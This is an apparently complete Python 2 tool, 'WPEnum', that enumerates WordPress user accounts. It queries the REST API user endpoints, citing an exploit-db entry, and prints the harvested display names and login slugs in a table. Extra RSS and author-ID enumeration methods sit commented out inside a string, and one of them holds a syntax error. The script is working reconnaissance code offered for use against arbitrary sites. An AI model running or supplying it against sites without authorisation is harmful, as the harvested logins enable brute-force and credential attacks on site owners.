#!/usr/bin/env python
# -*- coding: utf-8 -*-
#############################################
# WPEnum: WordPress User Enumeration Bypass #
# @author: Momo Outaadi (M4ll0k)            #
#############################################

from time import sleep
from sys import argv
from json import loads
from re import findall,I 
from urllib2 import Request,HTTPError,urlopen
from humanfriendly.tables import format_pretty_table
from humanfriendly import Spinner 

class WPEnum(object):
	def __init__(self,url):
		self.url = url
		self.users = []
	
	def WPUsage(self):
		print "#"*46
		print "# WPEnum - WordPress User Enumeration Bypass #"
		print "#        Momo Outaadi (M4ll0k)               #"
		print "#"*46+"\n"
		print "$ python {name} http://www.site.com\n".format(name=argv[0])

	__data__ = None
	__headers__ = {'User-Agent' : 'Mozilla5/0'}
	
	def Request(self,url,data,headers):
		try:
			req = Request(
				url = url,data = data,headers = headers
				)
			return urlopen(req)
		except HTTPError,e:
			pass

	def CheckPath(self,url,path):
		if url.endswith('/') and path.startswith('/'):
			return url[:-1]+path
		elif not url.endswith('/') and not path.startswith('/'):
			return url+"/"+path
		else:
			return url+path

	def WPJson(self):
		# https://www.exploit-db.com/exploits/41497/
		try:
			url = self.CheckPath(self.url,"/wp-json/wp/v2/users")
			req = self.Request(url,self.__data__,self.__headers__)
			if req.getcode() == 200:
				content = loads(req.read(),encoding="utf-8")
				for x in xrange(len(content)):
					self.users.append([content[x]['name'],content[x]['slug']])
		except Exception,e:
			pass

	def WPJson2(self):
		try:
			url = self.CheckPath(self.url,"/?rest_route=/wp/v2/users")
			req = self.Request(url,self.__data__,self.__headers__)
			if req.getcode() == 200:
				content = loads(req.read(),encoding="utf-8")
				for x in xrange(len(content)):
					self.users.append([content[x]['name'],content[x]['slug']])
		except Exception,e:
			pass
		"""
	def WPFeed(self):
		try:
			url = self.CheckPath(self.url,"/?feed=rss2")
			req = self.Request(url,self.__data__,self.__headers__)
			if req.getcode() == 200:
				self.usersfindall('<dc:creator><!\[CDATA\[(.+?)\]\]></dc:creator>',req.read(),I))
		except Exception,e:
			pass


	def WPAuthor(self):
		try:
			for x in xrange(0,10):
				url = self.CheckPath(self.url,"/?author=%s"%x)
				req = self.Request(url,self.__data__,self.__headers__)
				if req.getcode() == 200:
					self.users += findall(r'author author-(.+?)|author/(.+?)/feed/',req.read(),I)
					print self.users
		except Exception,e:
			pass
		"""

	def WPRun(self):
		count = 0
		with Spinner(label="Enumeration") as spinner:
			for i in range(15):
				sleep(0.1)
				spinner.step()
			print ""
			self.WPJson()
			self.WPJson2()
		column_user = ["ID","Username","Login"]
		print format_pretty_table(self.CheckUser(self.users),column_user)
	
	def CheckUser(self,users):
		_users_ = []
		tuple_user = []
		for user in users:
			if user not in _users_:
				_users_.append(user)
		for user in range(len(_users_)):
			if _users_[user][1] not in tuple_user:
				tuple_user.append([user,_users_[user][0],_users_[user][1]])
		return tuple_user

if __name__ == "__main__":
	try:
		if len(argv) <= 1:
			WPEnum(argv[0]).WPUsage()
			exit(0)
		WPEnum(argv[1]).WPRun()
	except KeyboardInterrupt,e:
		exit("Keyboard Interrupt...")
